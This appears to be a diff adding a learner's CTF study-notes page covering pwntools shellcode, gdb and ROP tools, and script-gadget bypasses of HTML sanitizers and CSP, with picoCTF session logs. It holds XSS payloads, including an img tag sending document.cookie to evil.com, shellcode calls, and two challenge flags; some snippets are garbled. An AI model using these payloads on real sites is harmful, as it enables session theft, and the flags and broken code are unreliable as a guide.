@@ -1,0 +1,171 @@
+<html>
+  <head>
+    <title>
+      07-07-2023
+    </title>
+  </head>
+  <body>
+    <pre>
+      from various sites and chat gpt
+      <code>
+        pwn.shellcraft.i386.linux.cat('flag.txt)
+generates the assemly code
+p.sendlin()
+p.interactive()
+pwn.shellcraft.i386.linux.sh()
+print(p.recvall().decode('latin-1))
+pwn.32()   pwn.p32() is a function used to pack an integer into a little-endian 32-bit representation.
+ EBX, ECX, and EDX
+ EAX is "Extended Accumulator.
+eip register 
+b'/x90' no operation
+        -------------------------
+        A Script Gadget is a piece of legitimate
+JavaScript code that can be triggered via an
+HTML injection and that upgrades otherwise
+benign HTML code to code execution
+
+
+HTML sanitizers remove known-bad and unknown HTML elements and
+attributes.
+<script>, onerror etc.
+
+
+Gadgets can bypass HTML sanitizers because:
+● JS code can be present in benign attributes (id, title)
+● Gadgets leverage data-* attributes a lot
+
+
+
+<script>
+    var scriptContent = document.getElementById("myDiv").innerHTML;
+    eval(scriptContent); // Execute the JavaScript code
+  </script>
+
+
+
+Content Security Policy identifies trusted and injected scripts.
+CSP stops the execution of injected scripts only
+
+<div data-toggle=tooltip data-html=true
+ title='&lt;script&gt;alert(1)&lt;/script&gt;'>
+
+
+
+Depending on the CSP mode, trusted scripts:
+● Are loaded from a whitelist of origins,
+● Are annotated with a secret nonce value
+
+
+<img src="http://evil.com/?cookie={{@global.document.cookie}}">
+
+
+Content Security Policy
+Distinguish legitimate and injected JS code
+• Whitelist legitimate origins
+• Whitelist code hash
+• Require a secret nonce
+
+WAFs, XSS filters
+Block requests containing dangerous tags / attributes
+
+
+
+Script Gadget is an *existing* JS code on the page that may be used to
+bypass mitigations:
+
+
+<div data-role="button"
+data-text="&lt;script&gt;alert(1)&lt;/script&gt;"></div>
+<script>
+ var buttons = $("[data-role=button]");
+ buttons.html(button.getAttribute("data-text"));
+</script>
+
+
+tar. gz or . tgz file is a compressed archive file format that is a combination of two other archive formats, namely TAR (tape archive) and GZIP
+
+
+ tar -xf filename.tar.gz
+file *
+
+
+ JAR stands for Java ARchive. It's a file format based on the popular ZIP file format and is used for aggregating
+ many files into on
+
+jar xf jar-file [archived-file(s)]
+
+
+ls-l
+
+java -jar Filename.jar
+
+curl -X POST
+
+
+https://webhook.site/
+
+<a href="">:gf</a>nutshell
+&lt;
+  ------------------------
+  gdb filename
+b * main   >breakpoint at main
+
+gef for patterns gdb  
+esp
+ni for next instruction
+x /500 $esp
+  sudo apt instal pwn tools
+ROPgadget --binary vulnfile
+
+open('filename",'mode).write(something+pwn.p32(hexvalue)
+
+locate ***
+pwn.asm()
+pwn.disasm()
+-------------------------
+  If select() returns a positive integer, it means that one or more file descriptors are ready for the specified I/O operation. The value indicates the number of file descriptors that are ready.
+If select() returns 0, it means that the specified timeout has elapsed, and no file descriptors are ready within that time period.
+If select() returns -1, it indicates an error occurred during the execution of select(). In this case, you can check the value of the errno variable to determine the specific error condition.
+
+basic file expolitaton
+┌──(radha㉿kali)-[/media/sf_usb/pico/binary/basicfilexp]
+└─$ nc saturn.picoctf.net 50959
+Hi, welcome to my echo chamber!
+Type '1' to enter a phrase into our database
+Type '2' to echo a phrase in our database
+Type '3' to exit the program
+1
+1
+Please enter your data:
+test
+test
+Please enter the length of your data:
+9
+9
+Your entry number is: 1
+Write successful, would you like to do anything else?
+2
+2
+Please enter the entry number of your data:
+0
+0
+picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}
+
+
+
+
+two-sum
+nc saturn.picoctf.net 55905
+n1 > n1 + n2 OR n2 > n1 + n2 
+What two positive numbers can make this possible: 
+2147483645 55
+You entered 2147483645 and 55
+You have an integer overflow
+YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_e06700c0}
+
+
+      </code>
+    </pre>
+  </body>
+</html>
